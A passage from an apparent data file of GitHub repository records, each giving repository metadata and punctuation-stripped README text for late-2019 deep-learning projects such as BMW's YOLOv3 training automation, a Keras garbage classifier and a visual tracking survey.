Already one for this project In the build directory run CMake gui and point cmake towards the OpenCV build directory if not already in the path Then close cmake gui This is the order because OpenCV is found before Torch and run the following command Point it towards the libtorch relative to the build directory cmake DCMAKEPREFIXPATH PWD libtorch Run cmake gui again and now point CUDNNINCLUDEPATH towards the include folder inside the cuDNN folder Point CUDNNLIBRARYPATH to the library file absolute path to cuDNN lib x64 cudnn lib Generate the project Code Structure Data Generation On a separate branch link https github com Black Phoenix Ai Path Tracer Denoiser tree datagen Build using only opencv similar to the steps above Training In Training C In Inference Bloopers The below result was obtained when the gradients of the network were exploding This was resolved using batch normalization imgs bad2 gif Useful links Credits 3D obj files with normals https casual effects com data Fresnel s law https blog demofox org 2017 01 09 raytracing reflection refraction fresnel total internal reflection and beers law Easier 3D obj files https graphics cmlab csie ntu edu tw robin courses cg04 model index html C Torch API https pytorch org cppdocs cuDNN https developer nvidia com cudnn,2019-11-09T16:12:53Z,2019-12-13T15:37:47Z,C++,Black-Phoenix,User,1,15,1,74,master,Iron-Stark#Black-Phoenix,2,0,0,0,0,0,1
BMW-InnovationLab,BMW-YOLOv3-Training-Automation,automation#computer-vision#computervision#darknet#deep-learning#deeplearning#docker#docker-image#gpu#monitoring#object-detection#objectdetection#preparing-weights#rest-api#tensorboard#yolo#yolo-gui#yolo-tensorboard#yologui#yolov3,YOLOv3 Training Automation API for Linux This repository allows you to get started with training a state of the art Deep Learning model with little to no configuration needed You provide your labeled dataset and you can start the training right away and monitor it in many different ways like TensorBoard or a custom REST API and GUI Training with YOLOv3 has never been so easy swaggeryolotraining png Prerequisites Ubuntu 18 04 16 04 could work but not tested Install dependencies bash chmod x scripts installdependencies sh source scripts installdependencies sh Install docker bash chmod x scripts installdocker sh source scripts installdocker sh Install NVIDIA Drivers and NVIDIA Docker for GPU training by following the official docs https github com nvidia nvidia docker wiki Installation version 2 0 At a glance Prepare the docker image with all weights for GPU usage bash sudo docker build f docker Dockerfile t darknetyologpu 1 build arg GPU 1 build arg CUDNN 1 build arg CUDNNHALF 0 build arg OPENCV 1 build arg DOWNLOADALL 1 terminalexample gifs 1 gif By default we include everything you will need inside this build If you want to manually adjust the weights you can go to Preparing weights preparing weights After this step jump directly to Preparing your dataset preparing your dataset Preparing Docker images Once your environment is ready you can prepare the docker images needed The environment is dockerized to run on GPU or CPU For GPU you need to build the image in the following way bash sudo docker build f docker Dockerfile t darknetyologpu 1 build arg GPU 1 build arg CUDNN 1 build arg CUDNNHALF 0 build arg OPENCV 1 For CPU only you can run the same command while setting GPU 0 CUDNN 0 and naming it darknetyolocpu 1 for clarity bash sudo docker build f docker Dockerfile t darknetyolocpu 1 build arg GPU 0 build arg CUDNN 0 build arg CUDNNHALF 0 build arg OPENCV 1 Preparing your dataset We provided a sampledataset to show how your data should be structured in order to start the training seemlesly The trainconfig json file found in sampledataset is a copy of the template config trainconfig json template with needed modifications The template can as well be copied as is while making sure to remove the template from the name You can also provide your own train txt and test txt to specify which images will be used for training and which ones are for testing If not provided the dataset will be split according to the data trainratio by default 80 train 20 test Starting the training To start the training on GPU make sure to add the execute permission on the sh scripts needed once only by running bash chmod x sh rundockerlinuxgpu sh This will ask for 2 main inputs The absolute path for the dataset The name of the container to run which will be also a prefix for the training output Once given the training will start and you can stop it at any time by pressing CTRL C inside the open terminal Closing the terminal will result in stopping the running container Training output Inside trainings you can find a folder with the naming convention For example it can be dogs dataset2019111014 21 41 Inside this folder you will have the following structure dogs dataset2019111014 21 41 config obj data obj names yolov3 cfg test txt train txt weights initial weights yolov310000 weights yolov31000 weights yolov32000 weights yolov33000 weights yolov34000 weights yolov35000 weights yolov36000 weights yolov37000 weights yolov38000 weights yolov39000 weights yolov3best weights yolov3last weights yoloevents log yoloevents log 1 Which shows the cfg file and weights used for the training along with all checkpoints and the normal yolo log output inside yoloevents files Monitoring the training You have 3 ways of monitoring the training Custom API One REST API with its Swagger API is also started during the training so you can get the YOLO output log in a structured JSON format as well as test custom images on the latest saved weights This can be accessed through port 8000 or a custom port you can set inside training customapi port GIF gifs 2 gif TensorboardX The loss and mAP can be visualized through Tensorboard which can be accessed on port 6006 or a custom port you can set inside training tensorboard port tensorboard png AlexeyAB provided webui This can be enabled by setting training webui enable to true in the trainconfig json you provide during the training It can later on be access through port 8090 or a custom port you can set inside training webui port and looks like the following Training monitoring webui https camo githubusercontent com d60dfdba6c007a5df888747c2c03664c91c12c1e 68747470733a2f2f6873746f2e6f72672f776562742f79642f766c2f61672f7964766c616775746f66327a636e6a6f64737467726f656e3861632e6a706567 Training config Meaning An explanation of different fields can be found in the json schema of the provided config which can be found at config trainconfigschema json Some of the elements are specific to YOLO itself like saturation hue rotation maxbatches and so on Those are greatly explained by AlexeyAB in their darknet fork https github com AlexeyAB darknet Benchmark OS Windows Ubuntu CPU CPU GPU Intel Xeon CPU 2 3 GHz Intel Xeon CPU 2 3 GHz Intel Core i9 7900 3 3 GHz GeForce GTX 1080 pascalvocdataset 0 793 second image 0 885 second image 0 295 second image 0 0592 second image Preparing weights Default yolo weights are provided on the official website https pjreddie com darknet yolo To download the different flavors please use the following commands Change your current working directory to be inside the repo The following steps will download yolov3 weights bash wget https pjreddie com media files yolov3 weights P config darknet yolodefaultweights yolov3 tiny weights bash wget https pjreddie com media files yolov3 tiny weights P config darknet yolodefaultweights darknet53 conv 74 bash wget https pjreddie com media files darknet53 conv 74 P config darknet yolodefaultweights Known Issues Issue related to darknet itself can be filed in the correct repo https github com AlexeyAB darknet We did not make any changes to the darknet code itself If you chose to build with GPU but in the configuration file did not provide gpus field the training will run on gpu 0 by default If during training you see nan values for avg loss field then training goes wrong but if nan is in some other lines then training goes well If error Out of memory occurs then you should try increasing subdivisions to 16 32 or 64 or have a smaller image size If training finishes immediately without any error you should decrease batch size and subdivisions Acknowledgements robotron de https www robotron de inmind ai https www inmind ai Lynn Nassif Beirut Lebanon Nour Azzi Beirut Lebanon,2019-12-11T16:48:38Z,2019-12-15T00:48:25Z,Python,BMW-InnovationLab,Organization,10,15,0,3,master,ESaller#Marc-Kamradt,2,1,1,0,0,0,0
YaoHaozhe,Computer-vision-based-on-deep-learning-garbage-classification,n/a,1 1 1 7 1 13 glass cardboard metal paper plastic trash 6 1 2 a b c 1 3 Python OpenCV Numpy Keras 1 4 OpenCVhttps opencv python tutroals readthedocs io en latest pytutorials pytutorials html Numpyhttps www numpy org Keras https keras io 2 2 1 2507 6 1 glass 497 2 paper 590 3 cardboard 400 4 plastic 479 5 metal 407 6 trash 134 512 384 https img blog csdnimg cn 2019110318422267 png x oss process image watermark typeZmFuZ3poZW5naGVpdGk shadow10 textaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MjE4NjU0 size16 colorFFFFFF t70 3 python from keras layers import Input Dense Flatten Dropout Activation from keras layers normalization import BatchNormalization from keras preprocessing image import ImageDataGenerator from keras callbacks import TensorBoard from keras preprocessing import image from keras models import loadmodel from keras models import Model import matplotlib pyplot as plt import glob os cv2 random time import numpy as np from keras models import Sequential from keras layers import Conv2D Flatten MaxPooling2D Dense from keras optimizers import SGD from keras applications vgg16 import VGG16 def processingdata datapath param datapath return train test traindata ImageDataGenerator 01 rescale 1 225 shearrange 0 1 lower upper 1 zoomrange 1 zoomrange zoomrange 0 1 widthshiftrange 0 1 heightshiftrange 0 1 horizontalflip True verticalflip True 0 1 validationsplit 0 1 validationdata ImageDataGenerator rescale 1 255 validationsplit 0 1 traingenerator traindata flowfromdirectory datapath height width 256 256 targetsize 150 150 batchsize 16 categorical binary sparse input None categorical one hot classmode categorical training validation subset training seed 0 validationgenerator validationdata flowfromdirectory datapath targetsize 150 150 batchsize 16 classmode categorical subset validation seed 0 return traingenerator validationgenerator def model traingenerator validationgenerator savemodelpath Vgg16 vgg16model VGG16 weights imagenet includetop False inputshape 150 150 3 topmodel Sequential topmodel add Flatten inputshape vgg16model outputshape 1 topmodel add Dense 256 activation relu topmodel add Dropout 0 5 topmodel add Dense 6 activation softmax model Sequential model add vgg16model model add topmodel compile https keras io models model compile model compile Adamsgdrmsprop optimizer SGD lr 1e 3 momentum 0 9 categoricalcrossentropy loss categoricalcrossentropy metrics accuracy model fitgenerator Sequence generator traingenerator epochs epochs 200 epoch stepsperepoch 2259 16 validationdata validationgenerator epoch validationsteps 248 16 model save savemodelpath return model def evaluatemode validationgenerator savemodelpath model loadmodel results Ynnex1 h5 loss accuracy loss accuracy model evaluategenerator validationgenerator print nLoss 2f Accuracy 2f loss accuracy 100 def predict img 1 2 3 param img PIL Image return string cardboard glass metal paper plastic trash 6 numpy img img resize 150 150 img image imgtoarray img modelpath results dnn h5 modelpath results dnn h5 modelpath results Ynnex1 h5 try modelpath os path realpath file replace main py modelpath except NameError modelpath modelpath model loadmodel modelpath expanddimsimg shape 1 img shape 0 img shape 1 img shape 2 x np expanddims img axis 0 y model predict x labels labels 0 cardboard 1 glass 2 metal 3 paper 4 plastic 5 trash predict labels np argmax y return predict def main return datapath datasets la1ji1fe1nle4ishu4ju4ji22 momodel dataset resized savemodelpath results Ynnex1 h5 traingenerator validationgenerator processingdata datapath model traingenerator validationgenerator savemodelpath evaluatemode validationgenerator savemodelpath if name main main 4 loss0 4390 https img blog csdnimg cn 20191103184359474 png https img blog csdnimg cn 20191103184603824 png x oss process image watermark typeZmFuZ3poZW5naGVpdGk shadow10 textaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MjE4NjU0 size16 colorFFFFFF t70 https img blog csdnimg cn 20191103184630728 png x oss process image watermark typeZmFuZ3poZW5naGVpdGk shadow10 textaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MjE4NjU0 size16 colorFFFFFF t70 momodel cn https img blog csdnimg cn 20191103184735253 png x oss process image watermark typeZmFuZ3poZW5naGVpdGk shadow10 textaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MjE4NjU0 size16 colorFFFFFF t70,2019-11-03T11:40:40Z,2019-12-08T14:26:33Z,Python,YaoHaozhe,User,1,14,0,2,master,YaoHaozhe,1,0,0,0,0,0,0
david10e10,High-Dim-TS-Medium,n/a,,2019-11-04T18:00:35Z,2019-11-22T07:54:28Z,Jupyter Notebook,david10e10,User,2,12,4,4,master,david10e10,1,0,0,0,0,0,0
pajouheshgar,TensorflowTutorial,n/a,TensorflowTutorial tensorflow 2 0 0 These are the materials I have prepared as a TA to teach to students who have enrolled in the Deep Learning course This tutorial is divided into three sessions 1 In the first session you will learn about Tensorflow basics You will learn about Computational Graphs Sessions Visualizing the graphs in TensorFlow Variable Scopes Name Scopes and some of the apparent mistakes that beginners usually make Linear Regression problem is also implemented in three different ways to illustrate what is the main idea of libraries like TensorFlow 2 In the second session you will learn how to create a Tensorflow model in an objective manner You will also implement a simple Data Loader without the concerns of RAM management You will see how the train set and validation set can be appropriately used to train the model and how to monitor the training process in the Tensorboard You will also learn about different optimizers and learning rate decay mechanisms in TensorFlow 3 In the third session you will learn about saving and restoring the model You will learn how to use TensorFlow s Dataset API to create a more effective Data Loader and how to parallelize I O and computations You will learn more visualizations that can be done using Tensorboard You will also learn how Tensorflow s Dataset API can be used for data augmentation,2019-11-23T00:09:22Z,2019-11-28T16:05:25Z,Jupyter Notebook,pajouheshgar,User,1,12,0,4,master,pajouheshgar,1,0,0,0,0,0,0
philtabor,Deep-Q-Learning-Paper-To-Code,n/a,Deep Q Learning Paper To Code Code for my course at Udemy https www udemy com course deep q learning from paper to code referralCode CBA45A3B737237E7BFD2 We analyze and implement the following papers Human Level Control Through Deep Reinforcement Learning https web stanford edu class psych209 Readings MnihEtAlHassibis15NatureControlDeepRL pdf Deep Reinforcement Learning with Double Q Learning https arxiv org abs 1509 06461 Dueling Network Architectures for Deep Reinforcement Learning https arxiv org abs 1511 06581 The course is still in review and this readme is a work in progress Better docs to come,2019-11-19T06:19:06Z,2019-12-14T03:08:55Z,Python,philtabor,User,1,10,5,11,master,philtabor,1,0,0,1,0,0,0
Tony607,Industrial-Defect-Inspection-segmentation,n/a,Automatic Defect Inspection with End to End Deep Learning https www dlology com blog automatic defect inspection with end to end deep learning DLology blog Quick start Run the notebook on Google Colab and free GPU Open in Colab https camo githubusercontent com 52feade06f2fecbf006889a904d221e6a730c194 68747470733a2f2f636f6c61622e72657365617263682e676f6f676c652e636f6d2f6173736574732f636f6c61622d62616467652e737667 https colab research google com github Tony607 Industrial Defect Inspection segmentation blob master IndustrialDefectInspectionwithimagesegmentation ipynb,2019-11-02T10:32:21Z,2019-12-08T01:50:26Z,Jupyter Notebook,Tony607,User,3,9,3,7,master,Tony607,1,0,0,0,0,0,0
vmorgenshtern,deepsegmentation,n/a,Region Segmentation via Deep Learning and Convex Optimization This repository contains an implementation of a classical algorithm for segmenting surfaces in point clouds called Region Growing Segmentation RGS It is based on RGS http www pointclouds org documentation tutorials regiongrowingsegmentation php a deep learning pipeline for segmenting faces in 3D point clouds Installation Create a virtual environment venvdeepseg with all required dependencies as follows Clone this repository Use a shell to execute following commands cd deepsegmentation conda create y n venvdeepseg python 3 6 8 anaconda conda activate venvdeepseg sh requirements txt Getting familiar with the folder structure Root folder Contains all available jupyter notebooks Contains shared functions Contains configuration files config json Base file for network configuration generatorconfig py Dictionary to adjust the generated point clouds ClassicRGS Contains all program code that is only linked with the RGS algorithm Also input and output files related to RGS are stored here Note The point cloud generator is not configured to store its output in this folder Point clouds need to be manually shifted to the input folder data Contains program code for the point cloud and patch datasets Contains all data that is linked with the deep learning pipeline inputdata When a dataset is generated data is automatically stored here networkdata Configuration files and network configurations are stored here during training outputdata Plots during training testing results and prediction results are stored here tempdata Temporary data is stored here and continuously overwritten Used e g when running the voxelization notebook tensorboardlogs Not used Network Contains program files linked to the deep learning pipeline Preprocessing Network Postprocessing PolyhedronGenerator Contains the program code for the polyhedron generator utils Contains utility program code Getting started Region Growing Segmentation Open the Jupyter notebook ClassicRegionGrowingSegmentation Make sure that the input path is correctly set After running the notebook find the files in the specified output path Deep Learning Pipeline You can evaluate existing models via the notebooks Predict or Evaluate The difference is that Evaluate has access to the ground truth data and returns more information You can train a new or existing model using the notebook Training By setting an experiment name it is assured that results are separated from other configurations To overwrite an existing experiment uncomment the delete line To continue training an existing experiment uncomment the createretrainexperiment line Make sure that the delete line is commented Datasets will automatically be created in these notebooks if not available Make sure that generatorconfig py is set as intended All results are stored in data outputdata After training is finished you can call the notebook ReadTrainingResults which will display results on the validation set and automatically generate an html version for archiving Independent notebooks Notebook PolyhedronGenerator You can use this to try the polyhedron generator Data will be stored in data tempdata Notebook Voxelization You can observe how the patches in a point cloud look and how a patch looks compared to its voxelized version Data will be stored in data tempdata Requirements The following requirements are all satisfied via the installation procedure given above Python 3 6 8 Pytorch 1 1 0 numpy 1 15 4 numba 0 43 1 plotly 3 10 0 matplotlib 3 0 2 scikit learn 0 21 2 scipy 1 3 0 tensorboard 1 14 0 tensorboardx 1 7 jupyter 1 0 0 python constraint 1 4 0 cvxpy 1 0 24,2019-11-14T16:40:03Z,2019-12-06T02:08:45Z,Python,vmorgenshtern,User,5,9,1,3,master,vmorgenshtern,1,0,0,0,0,0,0
mchijmma,DL-AFx,n/a,Deep Learning for Black Box Modeling of Audio Effects http link to paper Accompanying website https mchijmma github io DL AFx for the paper http link to paper nbsp nbsp nbsp nbsp nbsp nbsp Martnez Ramrez M A http m marco com Benetos E https www eecs qmul ac uk emmanouilb and Reiss J D http www eecs qmul ac uk josh Deep Learning for Black Box Modeling of Audio Effects submitted to the Applied Sciences Acoustics and Vibration Digital Audio Effects special issue December 2019 View the source code https github com mchijmma DL AFx tree master src Download the dataset https zenodo org record 3562442 Audio samples from the listening test Preamp Input CAFx WaveNet CRAFx CWAFx Reference nbsp Limiter Input CAFx WaveNet CRAFx CWAFx Reference nbsp Leslie speaker horn tremolo Input CAFx WaveNet CRAFx CWAFx Reference nbsp Leslie speaker woofer tremolo Input CAFx WaveNet CRAFx CWAFx Reference nbsp Leslie speaker horn chorale Input CAFx WaveNet CRAFx CWAFx Reference nbsp Leslie speaker woofer chorale Input CAFx WaveNet CRAFx CWAFx Reference nbsp Please use Mozilla Firefox or Google Chrome This project is maintained by Marco Martnez nbsp Citation aticlemartinez2019deep title Deep Learning for Black Box Modeling of Audio Effects author Mart inez Ram irez Marco A and Benetos Emmanouil and Reiss Joshua D booktitle Applied Sciences,2019-12-02T15:39:59Z,2019-12-13T09:35:57Z,Python,mchijmma,User,2,9,0,42,master,mchijmma,1,0,0,0,0,0,0
HymEric,AIWebMatting,deep-learning#human-segmentation#image-merge#image-synthesis#matting#portrait-matting#segmentation#video-editing#web,AIWebMatting This is a web project about auto matting with deep learning tech which can be used in image merge poster generate video editing etc web demo url http matting zsyhh com 4800 deploy cd docker buildandrun sh Reminds https github com HymEric AIWebMatting blob master reminds md,2019-11-09T14:26:52Z,2019-12-12T11:51:56Z,JavaScript,HymEric,User,2,9,1,51,master,QibinDai#HymEric#zsyh,3,0,0,1,0,1,1
MMarvasti,Deep-Learning-for-Visual-Tracking-Survey,n/a,Deep Learning for Visual Tracking A Comprehensive Survey Extended version of the paper on arXiv https arxiv org pdf 1912 00535 pdf The comprehensive comparisons of recent Deep Learning DL based visual tracking methods on the OTB 2013 OTB 2015 VOT 2018 and LaSOT datasets Licence copyright 2019 IEEE Personal use of this material is permitted Permission from IEEE must be obtained for all other uses in any current or future media including reprinting republishing this material for advertising or promotional purposes creating new collective works for resale or redistribution to servers or lists or reuse of any copyrighted component of this work in other works Performance Comparison of Visual Trackers in terms of Precision and Success Plots on OTB 2013 Dataset Ranking based on Area Under Curve AUC OTB 2013 Dataset http cvlab hanyang ac kr trackerbenchmark datasets html OTB 2013 Paper https ieeexplore ieee org document 6619156 Average Performance Comparisons of Visual Tracking Methods Attribute based Performance Comparisons Eleven attributes including Illumination Variation IV Scale Variation SV Occlusion OCC Deformation DEF Motion Blur MB Fast Motion FM In Plane Rotation IPR Out of Plane Rotation OPR Out of View OV Background Clutter BC Low Resolution LR Performance Comparison of Visual Trackers in terms of Precision and Success Plots on OTB 2015 Dataset Ranking based on Area Under Curve AUC OTB 2015 Dataset http cvlab hanyang ac kr trackerbenchmark datasets html OTB 2015 Paper https ieeexplore ieee org document 7001050 Average Performance Comparisons of Visual Tracking Methods Attribute based Performance Comparisons Eleven attributes including Illumination Variation IV Scale Variation SV Occlusion OCC Deformation DEF Motion Blur MB Fast Motion FM In Plane Rotation IPR Out of Plane Rotation OPR Out of View OV Background Clutter BC Low Resolution LR Performance Comparison of Visual Trackers on VOT 2018 Dataset VOT 2018 Dataset http www votchallenge net vot2018 dataset html VOT 2018 Paper https link springer com chapter 10 1007 978 3 030 11009 31 Experiment Baseline Expected Overlap Analysis Expected overlap curves Expected overlap scores Overview Expected Overlap Analysis Experiment Baseline Accuracy Robustness AR Ranking AR plot mean AR plot weightedmean AR plot pooled Table Accuracy Table Robustness Experiment Baseline Attribute based Ranking Camera Motion Illumination Change Motion Change Occlusion Size Change No Degradation Orderings for overall overlap Orderings for failures AR plot for camera motion AR plot for illumination change AR plot for motion change AR plot for occlusion AR plot for size change AR plot for no degradation Experiment Baseline Speed Report first to third methods are shown by yellow blue and green colors Raw Frame per Second FPS Normalized Equivalent Filter Operations EFO tracker speed in terms of a predefined filtering operation that the VOT tookit automatically carries out prior to running the experiments Experiment Unsupervised Overall Comparisons Average overlap Table Overlap Overview Orderings for overall overlap Experiment Unsupervised Attribute based Comparisons Overlap plot for camera motion Overlap plot for illum change Overlap plot for motion change Overlap plot for occlusion Overlap plot for size change Overlap plot for no degradation Experiment Unsupervised Speed Report first to third methods are shown by yellow blue and green colors Raw Frame per Second FPS Normalized Equivalent Filter Operations EFO tracker speed in terms of a predefined filtering operation that the VOT tookit automatically carries out prior to running the experiments Overall Comparison Report Overview Qualitative Comparisons of State of the art Visual Tracking Methods on VOT2018 Dataset Under TraX Protocol https www sciencedirect com science article pii S0925231217303065 BMXVideo https www youtube com watch v M4GVQZt7MnU Crabs1Video https www youtube com watch v NfpM9BqAaOo Gymnastics3Video https www youtube com watch v fB9S314JZnc Motorcross2Video https www youtube com watch v MfveEsYkImw Singer3Video https www youtube com watch v iUPZqkkqu7Y GodfatherVideo https www youtube com watch v HKdQpRZGNfw BagVideo https www youtube com watch v NiPJs pKiR0 DinasaurVideo https www youtube com watch v GEAQluHbf2o MatrixVideo https www youtube com watch v l9FxuvHWis HandVideo https www youtube com watch v GVbVyvDvRSE GloveVideo https www youtube com watch v ORnrJzywLCA Ball2Video https www youtube com watch v PBUQCcWHN0 BlanketVideo https www youtube com watch v aznGIj0g88Q Gymnastics1Video https www youtube com watch v IQ5LyyScnlM ButterflyVideo https www youtube com watch v oy2OonlGrIw Motorcross1Video https www youtube com watch v U6wSJ6fX8gk PedestrianVideo https www youtube com watch v k0NIvzLCdDk Singer2Video https www youtube com watch v xuPpytH8Qps ShakingVideo https www youtube com watch v 8oIPuZy4DH0 RacingVideo https www youtube com watch v 6Fh vW4vRHY Handball1Video https www youtube com watch v jW7TTJqbjtI SheepVideo https www youtube com watch v qDmKJm3usf4 Bolt1Video https www youtube com watch v EtXuGAsQWJo FernandoVideo https www youtube com watch v PnKkfL6DIc Bolt2Video https www youtube com watch v CxAYVz9qkUk BookVideo https www youtube com watch v GJa7q rmaxA LeavesVideo https www youtube com watch v oABawv8SaA Fish1Video https www youtube com watch v FU1r4JXgfyM Fish2Video https www youtube com watch v yQF9VuIh1Yg TigerVideo https www youtube com watch v LG3lenIEOC8 WiperVideo https www youtube com watch v AABuilw6fJk TrafficVideo https www youtube com watch v wRB6ZiitcY CrossingVideo https www youtube com watch v U4WXqTxTKY Fish3Video https www youtube com watch v JReWhzvSkug Ball1Video https www youtube com watch v kPrrhZGVlU GraduateVideo https www youtube com watch v 5Q38SEF3hkA IceskaterVideo https www youtube com watch v TQrMO25mt50 SoldierVideo https www youtube com watch v Kt gR67tqm0 DroneAcrossVideo https www youtube com watch v vX7WLTvKaM Soccer2Video https www youtube com watch v u9u92BSiSIc DroneFlipVideo https www youtube com watch v RDRaX0PVc1Y Ants1Video https www youtube com watch v ANOM he1nEs IceskaterVideo https www youtube com watch v wGYKt8TGkc4 Handball2Video https www youtube com watch v ZDsIgEdELps NatureVideo https www youtube com watch v Xmy8diVwD8s Ants3Video https www youtube com watch v RXsBGQYeglI RoadVideo https www youtube com watch v inT VDI9BpY HelicopterVideo https www youtube com watch v hKW42Wy43CA GirlVideo https www youtube com watch v FS3ZmQLuUo8 Gymnastics2Video https www youtube com watch v oRyLZW4GsSo ConductionVideo https www youtube com watch v 80T2zvQhOnU Zebrafish1Video https www youtube com watch v VwAr9rnqXQ8 BasketballVideo https www youtube com watch v pDR5n7v82BI FrisbeeVideo https www youtube com watch v lgzWuEBKvSY Car1Video https www youtube com watch v sfArINezfzo Birds1Video https www youtube com watch v sromxvJbQhs Drone1Video https www youtube com watch v RvmgMrItjmI FlamingoVideo https www youtube com watch v n0HDvwaMJaY Performance Comparison of Visual Trackers in terms of Precision and Success Plots on LaSOT Dataset Ranking based on Area Under Curve AUC LaSOT Dataset https cis temple edu lasot LaSOT Paper https arxiv org abs 1809 07845 Average Performance Comparisons of Visual Tracking Methods Attribute based Performance Comparisons Fourteen attributes including Illumination Variation IV Scale Variation SV Deformation DEF Motion Blur MB Fast Motion FM Out of View OV Background Clutter BC Low Resolution LR Aspect Ratio Change ARC Camera Motion CM Full Occlusion FOC Partial Occlusion POC Viewpoint Change VC Rotation ROT References Experimentally Evaluated Visual Tracking Methods 1 C Ma J B Huang X Yang and M H Yang Hierarchical convolutional features for visual tracking in Proc IEEE ICCV 2015 pp 30743082 HCFT https ieeexplore ieee org document 7410709 2 M Danelljan G Hager F S Khan and M Felsberg Convolutional features for correlation filter based visual tracking in Proc IEEE ICCVW 2016 pp 621629 DeepSRDCF https www cv foundation org openaccess contenticcv2015workshops w14 papers DanelljanConvolutionalFeaturesforICCV2015paper pdf 3 M Danelljan A Robinson F S Khan and M Felsberg Beyond correlation filters Learning continuous convolution operators for visual tracking in Proc ECCV vol 9909 LNCS 2016 pp 472488 CCOT https link springer com chapter 10 1007 978 3 319 46454 129 4 L Bertinetto J Valmadre J F Henriques A Vedaldi and P H Torr Fully convolutional Siamese networks for object tracking in Proc ECCV 2016 pp 850865 SiamFC http www robots ox ac uk luca siamese fc html 5 R Tao E Gavves and A W Smeulders Siamese instance search for tracking in Proc IEEE CVPR 2016 pp 14201429 SINT https ieeexplore ieee org document 7780527 6 H Nam and B Han Learning multi domain convolutional neural networks for visual tracking in Proc IEEE CVPR 2016 pp 42934302 MDNet https ieeexplore ieee org document 7780834 7 Y Qi S Zhang L Qin H Yao Q Huang J Lim and M H Yang Hedged deep tracking in Proc IEEE CVPR 2016 pp 43034311 HDT https ieeexplore ieee org document 7780835 8 H Fan and H Ling Parallel tracking and verifying A framework for real time and high accuracy visual tracking in Proc IEEE ICCV 2017 pp 54875495 PTAV http openaccess thecvf com contentICCV2017 papers FanParallelTrackingandICCV2017paper pdf 9 H Fan and H Ling Parallel tracking and verifying IEEE Trans Image Process vol 28 no 8 pp 41304144 2019 PTAV https ieeexplore ieee org document 8667882 10 Z Zhu G Huang W Zou D Du and C Huang UCT Learning unified convolutional networks for real time visual tracking in Proc ICCVW 2018 pp 19731982 UCT http openaccess thecvf com contentICCV2017workshops papers w28 ZhuUCTLearningUnifiedICCV2017paper pdf 11 Q Guo W Feng C Zhou R Huang L Wan and S Wang Learning dynamic Siamese network for visual object tracking in Proc IEEE ICCV 2017 pp 17811789 DSiam http openaccess thecvf com contentICCV2017 papers GuoLearningDynamicSiameseICCV2017paper pdf 12 J Valmadre L Bertinetto J Henriques A Vedaldi and P H Torr End to end representation learning for correlation filter based tracking in Proc IEEE CVPR 2017 pp 50005008 CFNet https ieeexplore ieee org document 8100014 13 M Danelljan G Bhat F Shahbaz Khan and M Felsberg ECO Efficient convolution operators for tracking in Proc IEEE CVPR 2017 pp 69316939 ECO https ieeexplore ieee org document 8100216 14 A Lukezic T Vojr L C ehovin Zajc J Matas and M Kristan Discriminative correlation filter tracker with channel and spatial reliability IJCV vol 126 no 7 pp 671688 2018 DeepCSRDCF https link springer com article 10 1007 s11263 017 1061 3 15 T Zhang C Xu and M H Yang Multi task correlation particle filter for robust object tracking in Proc IEEE CVPR 2017 pp 48194827 MCPF https ieeexplore ieee org document 8099995 16 J Choi H J Chang S Yun T Fischer Y Demiris and J Y Choi Attentional correlation filter network for adaptive visual tracking in Proc IEEE CVPR 2017 pp 48284837 ACFN https ieeexplore ieee org document 8099996 17 Q Wang J Gao J Xing M Zhang and W Hu DCFNet Discriminant correlation filters network for visual tracking 2017 Online DCFNet DCFNet2 http arxiv org abs 1704 04057 18 X Dong and J Shen Triplet loss in Siamese network for object tracking in Proc ECCV vol 11217 LNCS 2018 pp 472488 TripletLoss CFNet TripletLoss SiamFC TripletLoss CFNet2 https link springer com chapter 10 1007 978 3 030 01261 828 19 G Bhat J Johnander M Danelljan F S Khan and M Felsberg Unveiling the power of deep tracking in Proc ECCV 2018 pp 493509 UPDT https link springer com chapter 10 1007 978 3 030 01216 830 20 Z Zhu Q Wang B Li W Wu J Yan and W Hu Distractor aware Siamese networks for visual object tracking in Proc ECCV vol 11213 LNCS 2018 pp 103119 DaSiamRPN https link springer com chapter 10 1007 978 3 030 01240 37 21 Y Zhang L Wang J Qi D Wang M Feng and H Lu Structured Siamese network for real time visual tracking in Proc ECCV 2018 pp 355370 StructSiam https link springer com chapter 10 1007 978 3 030 01240 322 22 H Morimitsu Multiple context features in Siamese networks for visual object tracking in Proc ECCVW 2019 pp 116131 Siam MCF https link springer com chapter 10 1007 978 3 030 11009 36 23 J Choi H J Chang T Fischer S Yun K Lee J Jeong Y Demiris and J Y Choi Context aware deep feature compression for high speed visual tracking in Proc IEEE CVPR 2018 pp 479488 TRACA https ieeexplore ieee org document 8578155 24 Y Song C Ma X Wu L Gong L Bao W Zuo C Shen R W Lau and M H Yang VITAL Visual tracking via adversarial learning in Proc IEEE CVPR 2018 pp 89908999 VITAL https ieeexplore ieee org document 8579035 25 F Li C Tian W Zuo L Zhang and M H Yang Learning spatial temporal regularized correlation filters for visual tracking in Proc IEEE CVPR 2018 pp 49044913 DeepSTRCF https ieeexplore ieee org document 8578613 26 B Li J Yan W Wu Z Zhu and X Hu High performance visual tracking with Siamese region proposal network in Proc IEEE CVPR 2018 pp 89718980 SiamRPN https ieeexplore ieee org document 8579033 27 A He C Luo X Tian andW Zeng A twofold Siamese network for real time object tracking in Proc IEEE CVPR 2018 pp 48344843 SA Siam https ieeexplore ieee org document 8578606 28 C Sun D Wang H Lu and M H Yang Learning spatial aware regressions for visual tracking in Proc IEEE CVPR 2018 pp 89628970 LSART https ieeexplore ieee org document 8579032 29 C Sun D Wang H Lu and M H Yang Correlation tracking via joint discrimination and reliability learning in Proc IEEE CVPR 2018 pp 489497 DRT https ieeexplore ieee org document 8578156 30 S Pu Y Song C Ma H Zhang and M H Yang Deep attentive tracking via reciprocative learning in Proc NIPS 2018 pp 19311941 DAT http papers nips cc paper 7463 deep attentive tracking via reciprocative learning 31 C Ma J B Huang X Yang and M H Yang Robust visual tracking via hierarchical convolutional features IEEE Trans Pattern Anal Mach Intell 2018 HCFTs https ieeexplore ieee org document 8434334 32 C Ma J B Huang X Yang and M H Yang Adaptive correlation filters with long term and short term memory for object tracking IJCV vol 126 no 8 pp 771796 2018 LCTdeep https link springer com article 10 1007 s11263 018 1076 4 33 E Gundogdu and A A Alatan Good features to correlate for visual tracking IEEE Trans Image Process vol 27 no 5 pp 25262540 2018 CFCF https ieeexplore ieee org document 8291524 34 H Fan and H Ling Siamese cascaded region proposal networks for real time visual tracking in Proc IEEE CVPR 2019 C RPN http openaccess thecvf com 